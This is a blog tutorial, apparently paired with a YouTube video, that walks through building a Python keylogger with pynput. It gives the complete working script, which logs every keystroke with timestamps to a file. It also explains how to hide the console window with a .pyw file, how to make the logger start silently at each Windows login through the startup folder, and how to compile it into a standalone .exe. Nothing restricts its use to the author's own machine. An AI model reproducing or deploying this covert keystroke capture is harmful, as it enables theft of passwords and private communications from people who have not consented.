---
layout: post
title: "Python Keylogger"
date: 2017-12-15
categories: Youtube
tags: Python Keyboard Logging pynput
description: "This is a python keylogger which will work on windows, mac and linux. This script uses the pynput module. This python keylogger will store typed keys in a file in order of when they were typed."
---

* content
{:toc}

This is a python keylogger which will work on windows, mac and linux. This script uses the pynput module. This python keylogger will store typed keys in a file in order of when they were typed.

{% include embedYouTube.html content="x8GbWt56TlY" %}

<!-- more -->

## PIP
If you haven't used or setup pip before, go to my tutorial at [{% link _posts/2017-12-13-how-to-setup-pythons-pip.md %}]({{ site.baseurl }}{% link _posts/2017-12-13-how-to-setup-pythons-pip.md %}) to setup pip. This is needed to install pynput to get keys typed.

## Installing Pynput
We will be using the pynput module to listen to mouse events. To install this module execute ```pip install pynput``` in cmd. Watch the output to make sure no errors have occurred; it will tell you when the module has been successfully installed.

![Installing pynput](/images/how-to-get-mouse-clicks-with-python/pynput1.png)

To double check that it was installed successfully, open up IDLE and execute the command ```import pynput```; no errors should occur.

![Testing pynput](/images/how-to-get-mouse-clicks-with-python/pynput2.png)

## Building the Keylogger
Create a new Python file and import Key and Listener from pynput.keyboard and the logging module.

```python
from pynput.keyboard import Key, Listener
import logging
```

Next set a variable which points to where you want to save the logs; leave this as an empty string to save the log beside the python script. Then setup the logging module as shown below.

```python
log_dir = ""

logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

```

Then create a definition for keypresses called on_press which takes key as a parameter. In this definition we want to log using the info method the key type casted to a string.

```python
def on_press(key):
    logging.info(key)
```

Next setup an instance of Listener and define the on_press method in a with statement and then join the instance to the main thread.

```python
with Listener(on_press=on_press) as listener:
    listener.join()
```

Now save the file with a .pyw file extension to make sure that the console doesn't appear when it's run.

![Save as .pyw](/images/python-keylogger/pyw.png)

Run the script in IDLE to make sure that you haven't made any errors. Errors will show up in here if some do occur.

## Autostart
To make the script run on startup first go to your startup folder. Hold down the windows button and press "R" or type run in the windows menu to make the run dialog appear.

![shell:startup example](/images/python-keylogger/run.png)

Now type ```shell:startup``` in the dialog and press enter. This will open a window at your startup folder.

Copy the keylogger into this folder and then create a new folder somewhere else for logs to be saved to. Make sure this folder is not in the startup folder or it will be opened every time the computer has started. Open the keylogger in IDLE and now change the log_dir to the location of the folder you just created. Make sure this folder path uses forward slashes ('/') and contains a forward slash at the end.

## Stopping the Keylogger
To stop the keylogger, open up task manager and look for anything named python as shown below due to windows just showing program names. If you have an older version of windows, I recommend looking for pythonw.exe. Right click on this and end the task.

![Python in task manager](/images/python-keylogger/taskmgr.png)

## Final Script
```python
from pynput.keyboard import Key, Listener
import logging

log_dir = ""

logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(key)

with Listener(on_press=on_press) as listener:
    listener.join()
```

## Compile to EXE
Want to convert this .py to a .exe? Head over to my tutorial at [{{ site.baseurl }}{% link _posts/2017-12-11-convert-py-to-exe.md %}]({{ site.baseurl }}{% link _posts/2017-12-11-convert-.py-to-.exe.md %}) to do it in a few easy steps. This tutorial also shows you how to remove the console that shows up, make one file executables and even add an icon.

Converting to .exe will allow the script to run on windows computers without python installed (python is pre-installed on mac and most linux computers)

## FAQ

### 'python' is not recognized as an internal or external command
Python hasn't been installed or it hasn't been installed properly. Go to [{% link _posts/2017-12-13-how-to-setup-pythons-pip.md %}]({{ site.baseurl }}{% link _posts/2017-12-13-how-to-setup-pythons-pip.md %}) and follow the tutorial. Just before you enter the scripts folder into the path variable, remove the "\scripts\" part at the end. You will also want to add another path with "\scripts\" to have pip.

### Where are the log files?
They will be located next to the python file (in the current directory for more advanced users). If it hasn't appeared, make sure you run the script in IDLE to check for errors you have made.

### What is pynput's GitHub page?
[https://github.com/moses-palmer/pynput](https://github.com/moses-palmer/pynput)

### It doesn't work
Make sure you run the script in IDLE to check for errors you have made

### How can I stop the listener?
As documented at [https://pythonhosted.org/pynput/keyboard.html](https://pythonhosted.org/pynput/keyboard.html) you can use pynput.keyboard.Listener.stop() to stop listening.

### "Shift + Right Click" action it only gives an option for Power Shell
Powershell is fine, don't worry, it does the same stuff and more. Use it.

*Please leave questions and comments related to the video on YouTube as they will be replied to faster there*